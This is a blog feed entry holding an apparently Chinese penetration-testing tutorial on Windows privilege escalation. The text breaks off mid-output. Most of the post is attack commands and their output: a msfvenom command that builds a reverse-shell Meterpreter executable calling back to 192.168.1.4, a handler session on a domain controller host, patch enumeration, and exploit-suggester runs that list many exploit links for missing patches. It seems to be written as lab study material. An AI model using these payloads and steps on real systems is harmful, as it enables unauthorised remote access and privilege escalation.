<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Lluna&#39;s Pure land.</title>
  
  <subtitle>What is life like when singing to wine?</subtitle>
  <link href="https://lunamoore.github.io/atom.xml" rel="self"/>
  
  <link href="https://lunamoore.github.io/"/>
  <updated>2021-07-29T06:18:16.946Z</updated>
  <id>https://lunamoore.github.io/</id>
  
  <author>
    <name>Lluna</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>内网渗透测试-权限提升</title>
    <link href="https://lunamoore.github.io/2021/07/29/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"/>
    <id>https://lunamoore.github.io/2021/07/29/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/</id>
    <published>2021-07-29T06:12:42.000Z</published>
    <updated>2021-07-29T06:18:16.946Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-漏洞发现"><a href="#0x01-漏洞发现" class="headerlink" title="0x01.漏洞发现"></a>0x01.漏洞发现</h2><h3 id="1-WMIC发现安装补丁"><a href="#1-WMIC发现安装补丁" class="headerlink" title="1.WMIC发现安装补丁"></a>1.WMIC发现安装补丁</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn</span><br></pre></td></tr></table></figure><h3 id="2-msf发现安装补丁"><a href="#2-msf发现安装补丁" class="headerlink" title="2.msf发现安装补丁"></a>2.msf发现安装补丁</h3><p><code>首先使用msfvenom生成恶意程序</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.4 LPORT=6666 -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure><a id="more"></a><p><code>启动msf监听</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/handler) &gt; options</span><br><span class="line"></span><br><span class="line">Module options (exploit/multi/handler):</span><br><span class="line"></span><br><span class="line">   Name  Current Setting  Required  Description</span><br><span class="line">   ----  ---------------  --------  -----------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  process          yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br><span class="line">   LHOST     192.168.1.4      yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     6666             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Wildcard Target</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(multi/handler) &gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>运行得到shell</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/handler) &gt; use post/windows/gather/enum_patches</span><br><span class="line">msf6 post(windows/gather/enum_patches) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.1.4:6666</span><br><span class="line">[*] Sending stage (175174 bytes) to 192.168.1.5</span><br><span class="line">[*] Meterpreter session 5 opened (192.168.1.4:6666 -&gt; 192.168.1.5:49172) at 2021-07-27                                                                                                   04:35:49 -0400</span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session 5...</span><br><span class="line">msf6 exploit(multi/handler) &gt; sessions</span><br><span class="line"></span><br><span class="line">Active sessions</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">  Id  Name  Type                     Information                   Connection</span><br><span class="line">  --  ----  ----                     -----------                   ----------</span><br><span class="line">  5         meterpreter x86/windows  JIYE\Administrator @ WIN7DC1  192.168.1.4:6666 -&gt; 192.168.1.5:49172 (192.168.1.5)</span><br><span class="line"></span><br><span class="line">msf6 exploit(multi/handler) &gt;</span><br></pre></td></tr></table></figure><p><code>使用post/windows/gather/enum_patches模块快速扫描缺失的补丁</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/handler) &gt; use post/windows/gather/enum_patches</span><br><span class="line">msf6 post(windows/gather/enum_patches) &gt;set session 5</span><br><span class="line">session =&gt; 5</span><br><span class="line">msf6 post(windows/gather/enum_patches) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Patch list saved to /root/.msf4/loot/20210727044047_default_192.168.1.5_enum_patches_596648.txt</span><br><span class="line">[+] KB2534111 installed on 7/10/2021</span><br><span class="line">[+] KB2999226 installed on 7/10/2021</span><br><span class="line">[+] KB4474419 installed on 7/10/2021</span><br><span class="line">[+] KB976902 installed on 11/21/2010</span><br><span class="line">[*] Post module execution completed</span><br><span class="line">msf6 post(windows/gather/enum_patches) &gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>使用post/multi/recon/local_exploit_suggester模块找出可能被利用的漏洞</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">msf6 post(windows/gather/enum_patches) &gt; use post/multi/recon/local_exploit_suggester</span><br><span class="line">msf6 post(multi/recon/local_exploit_suggester) &gt; set session 5</span><br><span class="line">msf6 post(multi/recon/local_exploit_suggester) &gt; run</span><br><span class="line"></span><br><span class="line">[*] 192.168.1.5 - Collecting local exploits for x86/windows...</span><br><span class="line">[*] 192.168.1.5 - 38 exploit checks are being tried...</span><br><span class="line">[+] 192.168.1.5 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.</span><br><span class="line">[+] 192.168.1.5 - exploit/windows/local/ikeext_service: The target appears to be vulnerable.</span><br><span class="line">[+] 192.168.1.5 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.</span><br><span class="line">[+] 192.168.1.5 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.</span><br><span class="line">[+] 192.168.1.5 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.</span><br><span class="line">[+] 192.168.1.5 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.</span><br><span class="line">[+] 192.168.1.5 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.</span><br><span class="line">[-] 192.168.1.5 - Post interrupted by the console user</span><br><span class="line">[*] Post module execution completed</span><br><span class="line">msf6 post(multi/recon/local_exploit_suggester) &gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="3-Windows-Exploit-Suggester发现漏洞"><a href="#3-Windows-Exploit-Suggester发现漏洞" class="headerlink" title="3.Windows Exploit Suggester发现漏洞"></a>3.Windows Exploit Suggester发现漏洞</h3><p><code>首先下载数据库</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">E:\&gt;python2 windows-exploit-suggester.py --update</span><br><span class="line">[*] initiating winsploit version 3.3...</span><br><span class="line">[+] writing to file 2021-07-27-mssb.xls</span><br><span class="line">[*] done</span><br><span class="line"></span><br><span class="line">E:\&gt;</span><br></pre></td></tr></table></figure><p><code>安装xlrd文件</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip2 install xlrd==1.2.0</span><br></pre></td></tr></table></figure><p><code>检测</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">E:\&gt;python2 windows-exploit-suggester.py -d 2021-07-27-mssb.xls -i systeminfo.txt &gt; out.txt</span><br></pre></td></tr></table></figure><p><code>查看out.txt文件</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line">[*] initiating winsploit version 3.3...</span><br><span class="line">[*] database file detected as xls or xlsx based on extension</span><br><span class="line">[*] attempting to read from the systeminfo input file</span><br><span class="line">[+] systeminfo input file read successfully (utf-8)</span><br><span class="line">[*] querying database file for potential vulnerabilities</span><br><span class="line">[*] comparing the 4 hotfix(es) against the 386 potential bulletins(s) with a database of 137 known exploits</span><br><span class="line">[*] there are now 386 remaining vulns</span><br><span class="line">[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin</span><br><span class="line">[+] windows version identified as &#x27;Windows 7 SP1 64-bit&#x27;</span><br><span class="line">[*] </span><br><span class="line">[E] MS16-135: Security Update for Windows Kernel-Mode Drivers (3199135) - Important</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/40745/ -- Microsoft Windows Kernel - win32k Denial of Service (MS16-135)</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/41015/ -- Microsoft Windows Kernel - &#x27;win32k.sys&#x27; &#x27;NtSetWindowLongPtr&#x27; Privilege Escalation (MS16-135) (2)</span><br><span class="line">[*]   https://github.com/tinysec/public/tree/master/CVE-2016-7255</span><br><span class="line">[*] </span><br><span class="line">[E] MS16-098: Security Update for Windows Kernel-Mode Drivers (3178466) - Important</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/41020/ -- Microsoft Windows 8.1 (x64) - RGNOBJ Integer Overflow (MS16-098)</span><br><span class="line">[*] </span><br><span class="line">[M] MS16-075: Security Update for Windows SMB Server (3164038) - Important</span><br><span class="line">[*]   https://github.com/foxglovesec/RottenPotato</span><br><span class="line">[*]   https://github.com/Kevin-Robertson/Tater</span><br><span class="line">[*]   https://bugs.chromium.org/p/project-zero/issues/detail?id=222 -- Windows: Local WebDAV NTLM Reflection Elevation of Privilege</span><br><span class="line">[*]   https://foxglovesecurity.com/2016/01/16/hot-potato/ -- Hot Potato - Windows Privilege Escalation</span><br><span class="line">[*] </span><br><span class="line">[E] MS16-074: Security Update for Microsoft Graphics Component (3164036) - Important</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/39990/ -- Windows - gdi32.dll Multiple DIB-Related EMF Record Handlers Heap-Based Out-of-Bounds Reads/Memory Disclosure (MS16-074), PoC</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/39991/ -- Windows Kernel - ATMFD.DLL NamedEscape 0x250C Pool Corruption (MS16-074), PoC</span><br><span class="line">[*] </span><br><span class="line">[E] MS16-063: Cumulative Security Update for Internet Explorer (3163649) - Critical</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/39994/ -- Internet Explorer 11 - Garbage Collector Attribute Type Confusion (MS16-063), PoC</span><br><span class="line">[*] </span><br><span class="line">[E] MS16-059: Security Update for Windows Media Center (3150220) - Important</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/39805/ -- Microsoft Windows Media Center - .MCL File Processing Remote Code Execution (MS16-059), PoC</span><br><span class="line">[*] </span><br><span class="line">[E] MS16-056: Security Update for Windows Journal (3156761) - Critical</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/40881/ -- Microsoft Internet Explorer - jscript9 Java­Script­Stack­Walker Memory Corruption (MS15-056)</span><br><span class="line">[*]   http://blog.skylined.nl/20161206001.html -- MSIE jscript9 Java­Script­Stack­Walker memory corruption</span><br><span class="line">[*] </span><br><span class="line">[E] MS16-032: Security Update for Secondary Logon to Address Elevation of Privile (3143141) - Important</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/40107/ -- MS16-032 Secondary Logon Handle Privilege Escalation, MSF</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/39574/ -- Microsoft Windows 8.1/10 - Secondary Logon Standard Handles Missing Sanitization Privilege Escalation (MS16-032), PoC</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/39719/ -- Microsoft Windows 7-10 &amp; Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (PowerShell), PoC</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/39809/ -- Microsoft Windows 7-10 &amp; Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (C#)</span><br><span class="line">[*] </span><br><span class="line">[M] MS16-016: Security Update for WebDAV to Address Elevation of Privilege (3136041) - Important</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/40085/ -- MS16-016 mrxdav.sys WebDav Local Privilege Escalation, MSF</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/39788/ -- Microsoft Windows 7 - WebDAV Privilege Escalation Exploit (MS16-016) (2), PoC</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/39432/ -- Microsoft Windows 7 SP1 x86 - WebDAV Privilege Escalation (MS16-016) (1), PoC</span><br><span class="line">[*] </span><br><span class="line">[E] MS16-014: Security Update for Microsoft Windows to Address Remote Code Execution (3134228) - Important</span><br><span class="line">[*]   Windows 7 SP1 x86 - Privilege Escalation (MS16-014), https://www.exploit-db.com/exploits/40039/, PoC</span><br><span class="line">[*] </span><br><span class="line">[E] MS16-007: Security Update for Microsoft Windows to Address Remote Code Execution (3124901) - Important</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/39232/ -- Microsoft Windows devenum.dll!DeviceMoniker::Load() - Heap Corruption Buffer Underflow (MS16-007), PoC</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/39233/ -- Microsoft Office / COM Object DLL Planting with WMALFXGFXDSP.dll (MS-16-007), PoC</span><br><span class="line">[*] </span><br><span class="line">[E] MS15-134: Security Update for Windows Media Center to Address Remote Code Execution (3108669) - Important</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/38911/ -- Microsoft Windows Media Center Library Parsing RCE Vulnerability aka self-executing&#x27; MCL File, PoC</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/38912/ -- Microsoft Windows Media Center Link File Incorrectly Resolved Reference, PoC</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/38918/ -- Microsoft Office / COM Object - &#x27;els.dll&#x27; DLL Planting (MS15-134)</span><br><span class="line">[*]   https://code.google.com/p/google-security-research/issues/detail?id=514 -- Microsoft Office / COM Object DLL Planting with els.dll</span><br><span class="line">[*] </span><br><span class="line">[E] MS15-132: Security Update for Microsoft Windows to Address Remote Code Execution (3116162) - Important</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/38968/ -- Microsoft Office / COM Object DLL Planting with comsvcs.dll Delay Load of mqrt.dll (MS15-132), PoC</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/38918/ -- Microsoft Office / COM Object els.dll DLL Planting (MS15-134), PoC</span><br><span class="line">[*] </span><br><span class="line">[E] MS15-112: Cumulative Security Update for Internet Explorer (3104517) - Critical</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/39698/ -- Internet Explorer 9/10/11 - CDOMStringDataList::InitFromString Out-of-Bounds Read (MS15-112)</span><br><span class="line">[*] </span><br><span class="line">[E] MS15-111: Security Update for Windows Kernel to Address Elevation of Privilege (3096447) - Important</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/38474/ -- Windows 10 Sandboxed Mount Reparse Point Creation Mitigation Bypass (MS15-111), PoC</span><br><span class="line">[*] </span><br><span class="line">[E] MS15-102: Vulnerabilities in Windows Task Management Could Allow Elevation of Privilege (3089657) - Important</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/38202/ -- Windows CreateObjectTask SettingsSyncDiagnostics Privilege Escalation, PoC</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/38200/ -- Windows Task Scheduler DeleteExpiredTaskAfter File Deletion Privilege Escalation, PoC</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/38201/ -- Windows CreateObjectTask TileUserBroker Privilege Escalation, PoC</span><br><span class="line">[*] </span><br><span class="line">[M] MS15-100: Vulnerability in Windows Media Center Could Allow Remote Code Execution (3087918) - Important</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/38195/ -- MS15-100 Microsoft Windows Media Center MCL Vulnerability, MSF</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/38151/ -- Windows Media Center - Command Execution (MS15-100), PoC</span><br><span class="line">[*] </span><br><span class="line">[E] MS15-097: Vulnerabilities in Microsoft Graphics Component Could Allow Remote Code Execution (3089656) - Critical</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/38198/ -- Windows 10 Build 10130 - User Mode Font Driver Thread Permissions Privilege Escalation, PoC</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/38199/ -- Windows NtUserGetClipboardAccessToken Token Leak, PoC</span><br><span class="line">[*] </span><br><span class="line">[M] MS15-078: Vulnerability in Microsoft Font Driver Could Allow Remote Code Execution (3079904) - Critical</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/38222/ -- MS15-078 Microsoft Windows Font Driver Buffer Overflow</span><br><span class="line">[*] </span><br><span class="line">[M] MS15-051: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (3057191) - Important</span><br><span class="line">[*]   https://github.com/hfiref0x/CVE-2015-1701, Win32k Elevation of Privilege Vulnerability, PoC</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/37367/ -- Windows ClientCopyImage Win32k Exploit, MSF</span><br><span class="line">[*] </span><br><span class="line">[E] MS15-010: Vulnerabilities in Windows Kernel-Mode Driver Could Allow Remote Code Execution (3036220) - Critical</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/39035/ -- Microsoft Windows 8.1 - win32k Local Privilege Escalation (MS15-010), PoC</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/37098/ -- Microsoft Windows - Local Privilege Escalation (MS15-010), PoC</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/39035/ -- Microsoft Windows win32k Local Privilege Escalation (MS15-010), PoC</span><br><span class="line">[*] </span><br><span class="line">[E] MS15-001: Vulnerability in Windows Application Compatibility Cache Could Allow Elevation of Privilege (3023266) - Important</span><br><span class="line">[*]   http://www.exploit-db.com/exploits/35661/ -- Windows 8.1 (32/64 bit) - Privilege Escalation (ahcache.sys/NtApphelpCacheControl), PoC</span><br><span class="line">[*] </span><br><span class="line">[E] MS14-068: Vulnerability in Kerberos Could Allow Elevation of Privilege (3011780) - Critical</span><br><span class="line">[*]   http://www.exploit-db.com/exploits/35474/ -- Windows Kerberos - Elevation of Privilege (MS14-068), PoC</span><br><span class="line">[*] </span><br><span class="line">[M] MS14-064: Vulnerabilities in Windows OLE Could Allow Remote Code Execution (3011443) - Critical</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/37800// -- Microsoft Windows HTA (HTML Application) - Remote Code Execution (MS14-064), PoC</span><br><span class="line">[*]   http://www.exploit-db.com/exploits/35308/ -- Internet Explorer OLE Pre-IE11 - Automation Array Remote Code Execution / Powershell VirtualAlloc (MS14-064), PoC</span><br><span class="line">[*]   http://www.exploit-db.com/exploits/35229/ -- Internet Explorer &lt;= 11 - OLE Automation Array Remote Code Execution (#1), PoC</span><br><span class="line">[*]   http://www.exploit-db.com/exploits/35230/ -- Internet Explorer &lt; 11 - OLE Automation Array Remote Code Execution (MSF), MSF</span><br><span class="line">[*]   http://www.exploit-db.com/exploits/35235/ -- MS14-064 Microsoft Windows OLE Package Manager Code Execution Through Python, MSF</span><br><span class="line">[*]   http://www.exploit-db.com/exploits/35236/ -- MS14-064 Microsoft Windows OLE Package Manager Code Execution, MSF</span><br><span class="line">[*] </span><br><span class="line">[M] MS14-060: Vulnerability in Windows OLE Could Allow Remote Code Execution (3000869) - Important</span><br><span class="line">[*]   http://www.exploit-db.com/exploits/35055/ -- Windows OLE - Remote Code Execution &#x27;Sandworm&#x27; Exploit (MS14-060), PoC</span><br><span class="line">[*]   http://www.exploit-db.com/exploits/35020/ -- MS14-060 Microsoft Windows OLE Package Manager Code Execution, MSF</span><br><span class="line">[*] </span><br><span class="line">[M] MS14-058: Vulnerabilities in Kernel-Mode Driver Could Allow Remote Code Execution (3000061) - Critical</span><br><span class="line">[*]   http://www.exploit-db.com/exploits/35101/ -- Windows TrackPopupMenu Win32k NULL Pointer Dereference, MSF</span><br><span class="line">[*] </span><br><span class="line">[E] MS14-040: Vulnerability in Ancillary Function Driver (AFD) Could Allow Elevation of Privilege (2975684) - Important</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/39525/ -- Microsoft Windows 7 x64 - afd.sys Privilege Escalation (MS14-040), PoC</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/39446/ -- Microsoft Windows - afd.sys Dangling Pointer Privilege Escalation (MS14-040), PoC</span><br><span class="line">[*] </span><br><span class="line">[E] MS14-035: Cumulative Security Update for Internet Explorer (2969262) - Critical</span><br><span class="line">[E] MS14-029: Security Update for Internet Explorer (2962482) - Critical</span><br><span class="line">[*]   http://www.exploit-db.com/exploits/34458/</span><br><span class="line">[*] </span><br><span class="line">[E] MS14-026: Vulnerability in .NET Framework Could Allow Elevation of Privilege (2958732) - Important</span><br><span class="line">[*]   http://www.exploit-db.com/exploits/35280/, -- .NET Remoting Services Remote Command Execution, PoC</span><br><span class="line">[*] </span><br><span class="line">[M] MS14-012: Cumulative Security Update for Internet Explorer (2925418) - Critical</span><br><span class="line">[M] MS14-009: Vulnerabilities in .NET Framework Could Allow Elevation of Privilege (2916607) - Important</span><br><span class="line">[E] MS13-101: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (2880430) - Important</span><br><span class="line">[M] MS13-097: Cumulative Security Update for Internet Explorer (2898785) - Critical</span><br><span class="line">[M] MS13-090: Cumulative Security Update of ActiveX Kill Bits (2900986) - Critical</span><br><span class="line">[M] MS13-080: Cumulative Security Update for Internet Explorer (2879017) - Critical</span><br><span class="line">[M] MS13-069: Cumulative Security Update for Internet Explorer (2870699) - Critical</span><br><span class="line">[M] MS13-059: Cumulative Security Update for Internet Explorer (2862772) - Critical</span><br><span class="line">[M] MS13-055: Cumulative Security Update for Internet Explorer (2846071) - Critical</span><br><span class="line">[M] MS13-053: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Remote Code Execution (2850851) - Critical</span><br><span class="line">[M] MS13-009: Cumulative Security Update for Internet Explorer (2792100) - Critical</span><br><span class="line">[M] MS13-005: Vulnerability in Windows Kernel-Mode Driver Could Allow Elevation of Privilege (2778930) - Important</span><br><span class="line">[E] MS12-037: Cumulative Security Update for Internet Explorer (2699988) - Critical</span><br><span class="line">[*]   http://www.exploit-db.com/exploits/35273/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP &amp; EMET 5., PoC</span><br><span class="line">[*]   http://www.exploit-db.com/exploits/34815/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP &amp; EMET 5.0 Bypass (MS12-037), PoC</span><br><span class="line">[*] </span><br><span class="line">[*] done</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="4-Sherlock-ps1脚本查看漏洞"><a href="#4-Sherlock-ps1脚本查看漏洞" class="headerlink" title="4.Sherlock.ps1脚本查看漏洞"></a>4.Sherlock.ps1脚本查看漏洞</h3><p><code>首先上传到目标主机</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; upload Sherlock.ps1 C:</span><br><span class="line">[*] uploading  : /root/Sherlock.ps1 -&gt; C:</span><br><span class="line">[*] uploaded   : /root/Sherlock.ps1 -&gt; C:\Sherlock.ps1</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure><p><code>目标主机执行脚本</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\&gt; Import-Module .\Sherlock</span><br><span class="line">PS C:\&gt; Find-AllVulns &gt; out.txt</span><br></pre></td></tr></table></figure><p><code>查看out.txt</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span 